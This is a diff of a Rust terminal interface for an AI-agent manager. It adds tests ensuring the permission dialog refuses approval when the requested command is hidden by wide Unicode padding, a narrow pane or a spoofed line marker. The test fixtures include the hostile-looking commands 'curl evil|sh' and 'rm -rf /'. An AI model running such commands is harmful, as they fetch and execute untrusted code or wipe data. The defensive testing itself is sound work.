@@ -22,8 +22,9 @@ use dgc_protocol::model::{AgentState, Isolation, PendingPermission, ProviderKind
 use super::ConnectionState;
 use super::input::LineEditor;
 use super::layout::{
-    LEGEND, NARROW, PermissionLayout, SHORTENED_WARNING, TOO_SMALL, panes, permission_layout,
-    scroll_indicator, tail_cols, text_width, truncate_cols, wrap_line, wrap_text,
+    DIALOG_MAX_WIDTH, LEGEND, NARROW, PermissionLayout, SHORTENED_WARNING, TOO_SMALL, panes,
+    permission_layout, scroll_indicator, tail_cols, text_width, truncate_cols, wrap_line,
+    wrap_text,
 };
 use super::state::{
     AgentField, AppState, Dialog, Focus, NewAgentForm, NewWorkspaceForm, Row, WorkspaceField,
@@ -409,9 +410,9 @@ fn render_dialog(state: &AppState, frame: &mut Frame, pane: Rect) -> Option<(u16
         return None;
     }
     let area = frame.area();
-    let mut width = pane.width.min(72);
+    let mut width = pane.width.min(DIALOG_MAX_WIDTH);
+    let mut max_inner_height = usize::from(pane.height - 2);
     let inner_width = usize::from(width - 2);
-    let max_inner_height = usize::from(pane.height - 2);
     let body = match dialog {
         Dialog::Permission {
             permission,
@@ -423,6 +424,7 @@ fn render_dialog(state: &AppState, frame: &mut Frame, pane: Rect) -> Option<(u16
             // The same layout `update` used to judge a/s, for this terminal.
             let layout = permission_layout((area.width, area.height), &permission.summary);
             width = layout.dialog_width;
+            max_inner_height = layout.max_inner_height;
             permission_body(
                 state,
                 permission,
@@ -1538,6 +1540,56 @@ mod tests {
             );
         }
         assert!(responds(&press(&mut f.state, 'a')), "it all fit");
+    }
+
+    #[test]
+    fn halfwidth_sound_marks_cannot_hide_text_from_the_user() {
+        // ratatui draws U+FF9E/U+FF9F one column wide each (unicode-width
+        // says zero), so a run of them is one very wide grapheme.
+        let mut f = Fx::new();
+        let summary = format!("echo hi{}; curl evil|sh", "\u{ff9e}".repeat(70));
+        open_permission(&mut f, 120, 30, &summary);
+        let right = squash_from(&draw(&f.state, 120, 30), 36);
+        let shown = right.contains(";curlevil|sh");
+        let allowed = responds(&press(&mut f.state, 'a'));
+        assert!(
+            shown || !allowed,
+            "a approved text that was not drawn: {right}"
+        );
+        let mut f = Fx::new();
+        let summary = format!("echo hi{}; curl evil|sh", "\u{ff9f}".repeat(70));
+        open_permission(&mut f, 120, 30, &summary);
+        let right = squash_from(&draw(&f.state, 120, 30), 36);
+        let allowed = responds(&press(&mut f.state, 'a'));
+        assert!(right.contains(";curlevil|sh") || !allowed, "{right}");
+    }
+
+    #[test]
+    fn a_pane_too_narrow_for_the_text_refuses_allow_but_deny_works() {
+        for width in [19, 20, 24] {
+            let mut f = Fx::new();
+            open_permission(&mut f, width, 40, "\u{6f22}\u{5b57}rm -rf target");
+            let right = squash_from(&draw(&f.state, width, 40), 16);
+            let allowed = responds(&press(&mut f.state, 'a'));
+            let session = responds(&press(&mut f.state, 's'));
+            assert!(
+                !(allowed || session) || right.contains("rm-rftarget"),
+                "{width} columns: approved without seeing the text: {right}"
+            );
+            if width <= 20 {
+                assert!(!allowed && !session, "{width} columns cannot show the text");
+            }
+            assert!(responds(&press(&mut f.state, 'd')), "{width}: deny works");
+        }
+    }
+
+    #[test]
+    fn a_real_line_starting_with_the_marker_character_is_escaped() {
+        let mut f = Fx::new();
+        open_permission(&mut f, 120, 30, "first\n\u{21aa} rm -rf /\nthird");
+        let text = screen(&draw(&f.state, 120, 30));
+        assert_eq!(text.matches('\u{21aa}').count(), 0, "{text}");
+        assert!(text.contains("\\u{21aa} rm -rf /"), "{text}");
     }
 
     #[test]
